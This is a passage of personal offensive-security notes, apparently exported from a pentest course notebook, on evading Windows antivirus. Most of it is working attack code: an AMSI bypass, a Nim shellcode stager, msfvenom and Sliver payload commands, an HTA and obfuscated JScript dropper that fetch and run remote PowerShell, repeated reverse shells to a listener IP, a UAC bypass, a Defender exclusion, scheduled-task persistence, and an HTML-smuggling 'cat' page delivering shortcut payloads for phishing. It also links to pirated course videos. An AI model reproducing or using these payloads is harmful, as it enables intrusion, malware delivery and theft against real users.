scripts)</p><p></p><p></p><p></p><p>[Ref].Assembly.GetType(&#39;System.Management.Automation.&#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;QQBtAHMAaQBVAHQAaQBsAHMA&#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#39;))),&#39;NonPublic,Static&#39;).SetValue($null,$true)</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--Applocker_962.html"></a><h1 class='title level-5'>Applocker</h1><br/><p><span style="color:#cdab8f;">Running or no?</span></p><p>powershell -C Get-Service AppIDSvc</p><p></p><p><span style="color:#cdab8f;">Common path that&#39;s excluded:</span></p><p>C:\Windows\System32\spool\drivers\color</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion_458.html"></a><h1 class='title level-5'>AV Evasion</h1><br/><p>EV avasion:<ul><li>shellter, and look at pwk vids <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></li></ul></p><p></p><p><a href="https://pwk.hide01.ir/#video-path=media/video/COPY_00_00.mp4&time-offset=0">https://pwk.hide01.ir/#video-path=media/video/COPY_00_00.mp4&amp;time-offset=0</a></p><p><a href="https://pen300.hide01.ir/#video-path=media/video/COPY_00_00.mp4&time-offset=1">https://pen300.hide01.ir/#video-path=media/video/COPY_00_00.mp4&amp;time-offset=1</a></p><p></p><p>great av evasion playlist</p><p><a href="https://www.youtube.com/playlist?list=PL0UJtYdHHM44uqGlDN-DQUYzoOj5Mp3ZF">https://www.youtube.com/playlist?list=PL0UJtYdHHM44uqGlDN-DQUYzoOj5Mp3ZF</a></p><p></p><p></p><p>test </p><p><a href="https://www.youtube.com/watch?v=mUxBldesvAI">https://www.youtube.com/watch?v=mUxBldesvAI</a></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--malware_with_nim_616.html"></a><h1 class='title level-6'>malware with nim</h1><br/><p><a href="https://youtu.be/qq-S2syksL0">https://youtu.be/qq-S2syksL0</a></p><p><a href="https://www.youtube.com/watch?v=LoXg1YWbDeo&list=PLi4eaGO3umbp2TT8YnEQCWZ23YH9apnVJ">https://www.youtube.com/watch?v=LoXg1YWbDeo&amp;list=PLi4eaGO3umbp2TT8YnEQCWZ23YH9apnVJ</a></p><p></p><p></p><p></p><p>sudo apt install mingw-w64</p><p>sudo apt install nim</p><p>nimble install winim</p><p></p><p>nim c -d:mingw --cpu:amd64 --opt:size --app:gui /tmp/stager.nim</p><p>strip /tmp/stager.exe</p><p></p><p></p><p></p><p><h3>Run code through smbserver</h3></p><p></p><p>impacket-smbserver share . -smb2support -ts</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--malware_with_nim--Ex_1_stager.nim_617.html"></a><h1 class='title level-7'>Ex 1: stager.nim</h1><br/><p>import winim/lean</p><p></p><p>var filename = &quot;\\\\192.168.159.129\\share\\code.bin&quot;</p><p></p><p>var file: FIle = open(filename, fmRead)</p><p></p><p>var fileSize = file.getFileSize()</p><p></p><p>var shellcode = newSeq[byte](filesize)</p><p></p><p>discard file.readBytes(shellcode, 0, fileSize)</p><p></p><p>type</p><p>    buf* = LPVOID</p><p></p><p></p><p>var rez = VirtualAlloc(nil, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)</p><p>copyMem(rez, shellcode[0].addr, filesize)</p><p>let f = cast[proc(){.nimcall.}](rez)</p><p>f()</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--malware_with_nim--Ex_1_stager.nim--shellcode_618.html"></a><h1 class='title level-8'>shellcode</h1><br/><p>msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=eth0 LPORT=53 -f raw -o /tmp/code.bin</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--sliver_ps1_619.html"></a><h1 class='title level-6'>sliver ps1</h1><br/><p>generate beacon --os windows --arch amd64 -b https://192.168.159.129:443 -f shellcode -s /tmp/uwu.bin --skip-symbols</p><p>https -l 443</p><p>msfvenom -p generic/custom payloadfile=uwu.bin -a x64 -f psh -o uwu.ps1</p><p>iex (iwr -usebasicparsing <a href="http://192.168.119.156/rev2.ps1">http://192.168.119.156/uwu.ps1</a><a href="http://192.168.119.156/rev2.ps1)">)</a></p><p></p><p></p><p>=========</p><p></p><p></p><p>generate beacon --os windows --arch amd64 -m <a href="http://192.168.1.42:53">192.168.1.42:53</a> -f shellcode -s /tmp/uwu.bin --skip-symbols</p><p>mtls -l 53</p><p>msfvenom -p generic/custom payloadfile=uwu.bin -a x64 -f psh -o uwu.ps1</p><p>iex (iwr -usebasicparsing <a href="http://192.168.119.156/uwu.ps1">http://192.168.119.156/uwu.ps1</a><a href="http://192.168.119.156/rev2.ps1)">)</a></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--Scarecrow_870.html"></a><h1 class='title level-6'>Scarecrow</h1><br/><p>Gets around sometimes. Not reliable rly. But most shellcode ive made is generic, so made still be good.</p><p></p><p><span style="color:#3f4043;">Install:</span></p><p>git clone <a href="https://github.com/optiv/ScareCrow.git">https://github.com/optiv/ScareCrow.git</a></p><p>cd ScareCriw</p><p>go get github.com/fatih/color</p><p>go get github.com/yeka/zip</p><p>go get github.com/josephspurrier/goversioninfo</p><p>go get github.com/Binject/debug/pe</p><p>go get github.com/awgh/rawreader</p><p>sudo apt-get install osslsigncode</p><p></p><p>msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=eth0 LPORT=443 -f raw -o code.bin</p><p></p><p>ScareCrow -I code.bin --domain <a href="http://www.microsoft.com">www.microsoft.com</a> -encryptionmode AES</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--nim_working_revshell_877.html"></a><h1 class='title level-6'>nim working revshell?</h1><br/><p><a href="https://github.com/Sn1r/Nim-Reverse-Shell">https://github.com/Sn1r/Nim-Reverse-Shell</a></p><p></p><p>Works, but may need to compile a few times. Test on vm.</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--.hta_files_881.html"></a><h1 class='title level-6'>.hta files</h1><br/><p>&lt;html&gt;</p><p>&lt;head&gt;</p><p>&lt;title&gt;PowerShell Runner&lt;/title&gt;</p><p>&lt;HTA:APPLICATION </p><p>     APPLICATIONNAME=&quot;PowerShell Runner&quot;</p><p>     ID=&quot;PowerShellRunner&quot;</p><p>     SCROLL=&quot;no&quot;</p><p>     SINGLEINSTANCE=&quot;yes&quot;</p><p>     WINDOWSTATE=&quot;minimize&quot;</p><p>&gt;</p><p>&lt;/head&gt;</p><p>&lt;script language=&quot;VBScript&quot;&gt;</p><p>    Sub Window_OnLoad</p><p>        &#39; Create WScript Shell</p><p>        Set objShell = CreateObject(&quot;WScript.Shell&quot;)</p><p>        </p><p>        &#39; Run PowerShell command</p><p>        objShell.Run &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c iwr <a href="https://pastebin.com/raw/FFHv67w9">https://pastebin.com/raw/FFHv67w9</a> | iex&quot;, 1, false</p><p>        </p><p>        &#39; Close the HTA</p><p>        window.close</p><p>    End Sub</p><p>&lt;/script&gt;</p><p>&lt;body&gt;</p><p>&lt;/body&gt;</p><p>&lt;/html&gt;</p><p></p><p></p><p>========</p><p></p><p>this works for a shell, and gets around AV too as long as powershell does, which it does &lt;3 .hta so far for phisihng. doesnt get smartscreen, and content type doesnt seem sus really. </p><p><img src="images/881-1.png" alt="images/881-1.png" /></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--.js_files_898.html"></a><h1 class='title level-6'>.js files</h1><br/><p><strong><span style="color:#3f4043;">basic.js:</span></strong></p><p></p><p>var wshShell = new ActiveXObject(&quot;WScript.Shell&quot;);</p><p>wshShell.Run(&quot;powershell.exe -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <a href="http://192.168.255.132/obfuscated.ps1)">http://192.168.255.132/obfuscated.ps1)</a>&quot;);</p><p></p><p></p><p></p><p><strong><span style="color:#3f4043;">obfuscated.js:</span></strong></p><p>/* Variables</p><p>let myName = &quot;John&quot;;</p><p>let age = 25;</p><p></p><p>// Displaying Information</p><p>console.log(&quot;Hello, my name is &quot; + myName + &quot; and I am &quot; + age + &quot; years old.&quot;);</p><p></p><p>// Conditional Statement</p><p>if (age &gt;= 18) {</p><p>    console.log(&quot;I am an adult.&quot;);</p><p>} else {</p><p>    console.log(&quot;I am a minor.&quot;);</p><p>}</p><p></p><p>//LOTS OF SPACES HERE</p><p></p><p>*/</p><p>var _0x2d6779=_0x367c;function _0x367c(_0x14d829,_0x58897a){var _0x26fcf7=_0x26fc();return _0x367c=function(_0x367c59,_0x364a18){_0x367c59=_0x367c59-0x1d8;var _0x563018=_0x26fcf7[_0x367c59];return _0x563018;},_0x367c(_0x14d829,_0x58897a);}(function(_0xa8a94e,_0x38ed29){var _0x5af3ab=_0x367c,_0x43d524=_0xa8a94e();while(!![]){try{var _0x3ea956=-parseInt(_0x5af3ab(0x1d8))/0x1+-parseInt(_0x5af3ab(0x1db))/0x2*(-parseInt(_0x5af3ab(0x1e0))/0x3)+parseInt(_0x5af3ab(0x1df))/0x4*(-parseInt(_0x5af3ab(0x1dd))/0x5)+-parseInt(_0x5af3ab(0x1e5))/0x6+parseInt(_0x5af3ab(0x1e1))/0x7*(-parseInt(_0x5af3ab(0x1e4))/0x8)+parseInt(_0x5af3ab(0x1da))/0x9*(-parseInt(_0x5af3ab(0x1de))/0xa)+parseInt(_0x5af3ab(0x1d9))/0xb;if(_0x3ea956===_0x38ed29)break;else _0x43d524[&#39;push&#39;](_0x43d524[&#39;shift&#39;]());}catch(_0x5b752c){_0x43d524[&#39;push&#39;](_0x43d524[&#39;shift&#39;]());}}}(_0x26fc,0x85ea9));var wshShell=new ActiveXObject(_0x2d6779(0x1e2));function _0x26fc(){var _0x4118bc=[&#39;3392Lcywnm&#39;,&#39;3466128ESGILY&#39;,&#39;310913JOZlXW&#39;,&#39;27749865xOSdYU&#39;,&#39;108ELtBfI&#39;,&#39;92nhiSdR&#39;,&#39;powershell.exe\x20-ep\x20bypass\x20-WindowStyle\x20Hidden\x20IEX\x20(iwr\x20-usebasicparsing\x20htTp://192.168.255.132/obfuscated.ps1)&#39;,&#39;9865nDSiHL&#39;,&#39;448090mcpUvu&#39;,&#39;1292PHcbgm&#39;,&#39;9729pYCanA&#39;,&#39;987gPAWgv&#39;,&#39;WScript.Shell&#39;,&#39;Run&#39;];_0x26fc=function(){return _0x4118bc;};return _0x26fc();}wshShell[_0x2d6779(0x1e3)](_0x2d6779(0x1dc));</p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--powershell_obfuscation_(works)_873.html"></a><h1 class='title level-6'>powershell obfuscation (works)</h1><br/><p><a href="https://www.youtube.com/watch?v=NdyThrkNUwE">https://www.youtube.com/watch?v=NdyThrkNUwE</a></p><p></p><p><a href="https://github.com/gh0x0st/Invoke-PSObfuscation">https://github.com/gh0x0st/Invoke-PSObfuscation</a></p><p></p><p></p><p></p><p>gedit 1.ps1</p><p></p><p>$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.255.132&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String ); $sendback2 = $sendback + &quot;#&quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</p><p></p><p>pwsh</p><p>. ./Invoke-PSObfuscation</p><p>Invoke-PSObfuscation -Path ./1.ps1 -Integers -Cmdlets -ShowChanges</p><p>Invoke-PSObfuscation -Path ./1.ps1 -All</p><p></p><p>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <a href="http://192.168.255.132/obfuscated.ps1)">http://7.tcp.eu.ngrok.io:11101/obfuscated.ps1)</a></p><p><img src="images/873-1.png" alt="images/873-1.png" /></p><p>(Also remember to use the minimized window setting)</p><p>%systemroot%\system32\imageres.dll</p><p>%systemroot%\system32\notepad.exe</p><p></p><p></p><p><span style="color:#3f4043;">Powershell zipping:</span></p><p>Compress-Archive -Path .\personal.lnk -DestinationPath personal.zip</p><p>Expand-Archive -Path &quot;C:\users\robert\downloads\personal.zip&quot; -DestinationPath &quot;C:\windows\tasks\&quot;</p><p></p><p>===</p><p><a href="https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/B64.md">https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/B64.md</a></p><p><a href="https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md">https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md</a></p><p><span style="color:#3f4043;">UAC BYPASS</span></p><p>pwsh</p><p>. ./B64.ps1</p><p></p><p>B64 -encString &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -windowstyle hidden C:\users\ryan\desktop\personal.lnk&quot;</p><p></p><p>$code = &quot;bgBlAHQAIAB1AHMAZQByACAAYQBkAG0AaQBuACAAdABlAHMAdAAxADIAMwAgAC8AYQBkAGQA&quot;</p><p></p><p></p><p>(nEw-OBJECt Io.CoMpreSsion.DEflateSTrEaM([SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( &#39;hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv&#39;) ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION</p><p></p><p><span style="color:#3f4043;">EXCLUSION</span> <span style="color:#3f4043;">(Not actually needed, but can use B64 technique here too.)</span></p><p>Add-MpPreference -ExclusionPath &quot;C:\Windows\tasks&quot;</p><p></p><p><span style="color:#3f4043;">Persistance (dont run with elevated user):</span></p><p>copy &quot;c:\users\ryan\desktop\personal.lnk&quot; &quot;c:\windows\tasks\personal.lnk&quot;</p><p>schtasks /create /tn &quot;soon&quot; /sc minute /mo 1 /tr &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -windowstyle hidden C:\windows\tasks\personal.lnk&quot;</p><p></p><p></p><p></p><p></p></div><div class='page'><a name="ethdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--powershell_obfuscation_(works)--html_smuggling_example_884.html"></a><h1 class='title level-7'>html smuggling example</h1><br/><p>&lt;html&gt;</p><p>    &lt;body&gt;</p><p>    &lt;h1&gt;Cat Generator&lt;/h1&gt;</p><p>        &lt;script&gt;</p><p>            function base64ToArrayBuffer(base64) {</p><p>            var binary_string = window.atob(base64);</p><p>            var len = binary_string.length;</p><p>            </p><p>            var bytes = new Uint8Array( len );</p><p>                for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); }</p><p>                return bytes.buffer;</p><p>            }</p><p></p><p>            // 32bit simple reverse shell</p><p>            var file = &#39;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&#39;;</p><p>            var data = base64ToArrayBuffer(file);</p><p>            var blob = new Blob([data], {type: &#39;octet/stream&#39;});</p><p>            var fileName = &#39;meow.zip&#39;</p><p></p><p>            if (window.navigator.msSaveOrOpenBlob) {</p><p>                window.navigator.msSaveOrOpenBlob(blob,fileName);</p><p>            } else {</p><p>                var a = document.createElement(&#39;a&#39;);</p><p>                console.log(a);</p><p>                document.body.appendChild(a);</p><p>                a.style = &#39;display: none&#39;;</p><p>                var url = window.URL.createObjectURL(blob);</p><p>                a.href = url;</p><p>                a.download = fileName;</p><p>                a.click();</p><p>                window.URL.revokeObjectURL(url);</p><p>            }</p><p>        &lt;/script&gt;</p><p>  &lt;main&gt;</p><p>    &lt;section&gt;</p><p>      &lt;h2&gt;Free Cat Downloads&lt;/h2&gt;</p><p>      &lt;!-- TODO: Add link to cat photos --&gt;</p><p>      &lt;a href=&quot;<a href="https://freecatphotoapp.com">https://freecatphotoapp.com</a>&quot;&gt;&lt;img src=&quot;<a href="https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg">https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg</a>&quot; alt=&quot;A cute orange cat lying on its back.&quot;&gt;&lt;/a&gt;</p><p>      &lt;img src=&quot;<a href="http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php">http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php</a>&quot;/&gt;</p><p>    &lt;/section&gt;</p><p>    &lt;section&gt;</p><p>      &lt;h2&gt;Refresh For More Cats!&lt;/h2&gt;</p><p>      &lt;h3&gt;Things Cats Love:&lt;/h3&gt;</p><p>      &lt;ul&gt;</p><p>        &lt;li&gt;Cuddles&lt;/li&gt;</p><p>        &lt;li&gt;Laser Pointers&lt;/li&gt;</p><p>        &lt;li&gt;Yarn&lt;/li&gt;</p><p>        &lt;li&gt;Kisses&lt;/li&gt;  </p><p>      &lt;/ul&gt;</p><p>      &lt;img src=&quot;<a href="https://static.vecteezy.com/system/resources/thumbnails/009/665/322/small/cute-kitty-cat-family-greeting-cartoon-element-png.png">https://static.vecteezy.com/system/resources/thumbnails/009/665/322/small/cute-kitty-cat-family-greeting-cartoon-element-png.png</a>&quot; alt=&#39;soon&#39;</p><p>    &lt;/section&gt;</p><p>    &lt;section&gt;</p><p>    &lt;!-- &lt;img src=&quot;<a href="https://clipart-library.com/new_gallery/398422_cute-cat-png.png">https://clipart-library.com/new_gallery/398422_cute-cat-png.png</a>&quot; alt=&#39;Meow.&#39; --&gt;</p><p>    &lt;/section&gt;</p><p>  &lt;/main&gt;</p><p>    &lt;/body&gt;</p><p>&lt;/html&gt;</p><p></p><p></p><p></p><p></p><p></p><p></p><p>0.tcp.eu.ngrok.io:14555</p><p></p><p></p><p>meow</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--All_working_evasion_payloads_911.html"></a><h1 class='title level-6'>All working evasion payloads</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Windows_Privesc--Windows_Evasion--AV_Evasion--All_working_evasion_payloads--1.ps1_912.html"></a><h1 class='title level-7'>1.ps1</h1><br/><p>$a=&#39;192.168.255.132&#39;;$b=443;$c=New-Object Net.Sockets.TcpClient($a,$b);$d=$c.GetStream();[byte[]]$e=0..65535|%{0};while(($f=$d.Read($e,0,$e.Length))){$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($e,0,$f);$h=(iex &quot;. { $g } 2&gt;&amp;1&quot; | Out-String);$i=$h+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$j=([text.encoding]::ASCII).GetBytes($i);$d.Write($j,0,$j.Length);$d.Flush()};$c.Close()</p><p>=</p><p>$x=&#39;192.168.255.132&#39;;$y=443;$z=New-Object Net.Sockets.TcpClient($x,$y);$s=$z.GetStream();[byte[]]$b=0..65535|%{0};while(($r=$s.Read($b,0,$b.Length))){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$r);$o=(iex &quot;.{ $d } 2&gt;&amp;1&quot; | Out-String);$m=$o+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$n=([text.encoding]::ASCII).GetBytes($m);$s.Write($n,0,$n.Length);$s.Flush()};$z.Close()</p><p>=</p><p>$h=&#39;192.168.255.132&#39;;$i=443;$j=New-Object Net.Sockets.TcpClient($h,$i);$k=$j.GetStream();[byte[]]$l=0..65535|%{0};while(($m=$k.Read($l,0,$l.Length))){$n=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($l,0,$m);$o=(iex &quot;.{ $n } 2&gt;&amp;1&quot; | Out-String);$p=$o+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$q=([text.encoding]::ASCII).GetBytes($p);$k.Write($q,0,$q.Length);$k.Flush()};$j.Close()</p><p>=</p><p>$jepwJpq = New-Object System.Net.Sockets.TcpClient(&#39;192.168.255.132&#39;, 443);$jepwJpq.Connect();$lAgdIDe = New-Object byte[] 65535;while($true){$xCvBs = $jepwJpq.GetStream().Read($lAgdIDe, 0, $lAgdIDe.Length);$SdfjHg = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($lAgdIDe, 0, $xCvBs);$vYhxZq = (iex $SdfjHg) 2&gt;&amp;1; $response = &#39;&#39;;if ($vYhxZq -ne $null){$response = (Out-String -InputObject $vYhxZq);$WcKRmXk = $vYhxZq + &quot;`r`n&quot; + &quot;Out-String &quot;;$YpQbAzN = ([text.encoding]::ASCII).GetBytes($WcKRmXk);$jepwJpq.GetStream().Write($YpQbAzN, 0, $YpQbAzN.Length);$jepwJpq.GetStream().Flush()};Start-Sleep -Milliseconds 100}</p><p>=</p><p>$ip=&#39;192.168.255.132&#39;;$port=443;$client=New-Object Net.Sockets.TcpClient($ip,$port);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($readBytes=$stream.Read($buffer,0,$buffer.Length))){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$readBytes);$output=(iex &quot;. { $data } 2&gt;&amp;1&quot; | Out-String);$prompt=$output+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$encodedPrompt=([text.encoding]::ASCII).GetBytes($prompt);$stream.Write($encodedPrompt,0,$encodedPrompt.Length);$stream.Flush()};$client.Close()</p><p>=</p><p>$a=&#39;192.168.255.132&#39;;$b=443;$c=New-Object Net.Sockets.TcpClient($a,$b);$d=$c.GetStream();[byte[]]$e=0..65535|%{0};while(($f=$d.Read($e,0,$e.Length))){$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($e,0,$f);$h=(iex &quot;.{ $g } 2&gt;&amp;1&quot; | Out-String);$i=$h+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$j=([text.encoding]::ASCII).GetBytes($i);$d.Write($j,0,$j.Length);$d.Flush()};$c.Close()</p><p>=</p><p>$a=&#39;192.168.255.132&#39;;$b=443;$c=New-Object Net.Sockets.TcpClient($a,$b);$d=$c.GetStream();[byte[]]$e=0..65535|%{0};while(($f=$d.Read($e,0,$e.Length))){$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($e,0,$f);$h=(iex &quot;. { $g } 2&gt;&amp;1&quot; | Out-String);$i=$h+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;$j=([text.encoding]::ASCII).GetBytes($i);$d.Write($j,0,$j.Length);$d.Flush()};$c.Close()</p><p>=</p><p>$IP=&#39;192.168.255.132&#39;;$Port=443;$Client=New-Object Net.Sockets.TcpClient($IP,$Port);$Stream=$Client.GetStream();[byte[]]$Buffer=0..65535|%{0};while(($ReadBytes=$Stream.Read($Buffer,0,$Buffer.Length))){$Data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($Buffer,0,$ReadBytes);$Output=(iex &quot;. { $Data } 2&gt;&amp;1&quot; | Out-String);$Prompt=$Output+&#39;PS &#39;+(pwd).Path+&#39;&gt; 